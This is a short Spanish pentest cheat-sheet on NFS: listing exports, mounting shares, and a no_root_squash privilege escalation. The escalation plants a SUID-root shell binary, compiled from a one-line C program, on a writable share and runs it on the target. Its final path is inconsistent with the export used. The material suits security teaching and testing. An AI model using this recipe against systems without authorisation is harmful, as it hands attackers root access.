## NFS (Network File System)

**NFS** (_Network File System_, Sistema de Archivos de Red) permite **compartir directorios** entre máquinas a través de la red. En un pentest puede exponer archivos sensibles u ofrecer montajes con permisos mal configurados.

### Qué es

- Permite que una máquina monte un directorio remoto como si fuera local.
- Protocolo común en redes Unix/Linux.
- El riesgo viene de: **permisos demasiado abiertos** (world-readable/writable) o montajes **no_root_squash** (que permiten escribir como root).

### Listar recursos compartidos (Showmount)

```bash
showmount -e IP_OBJETIVO
```

`-e` lista los **exports** (directorios compartidos) que anuncia el servidor.

### Montar en Linux

```bash
sudo mount -t nfs IP_OBJETIVO:/ruta/remota /punto/montaje/local -o nolock
```

- `-t nfs` → tipo de sistema de archivos.
- `IP:/ruta/remota` → recurso compartido en el servidor.
- `/punto/montaje/local` → directorio local donde se monta.
- `-o nolock` → desactiva el bloqueo de archivos (evita errores comunes con algunos servidores).

### Escalada con NFS (no_root_squash)

Si el recurso compartido permite **escritura** y tiene la opción **`no_root_squash`**, podemos montarlo, crear un binario con SUID root en él y ejecutarlo:

```bash
# Montar el recurso
sudo mount -t nfs IP:/ruta /mnt/nfs -o nolock

# Compilar un binario con SUID root y copiarlo al recurso
echo 'int main(){setuid(0);system("/bin/sh");return 0;}' > bash.c
gcc bash.c -o /mnt/nfs/bash
chmod +s /mnt/nfs/bash

# Ejecutarlo desde la máquina objetivo
/mnt/bash
```

> Comprobar si el montaje tiene `no_root_squash` se hace en el servidor con `cat /etc/exports` (no siempre visible desde el atacante, pero vale la pena intentarlo).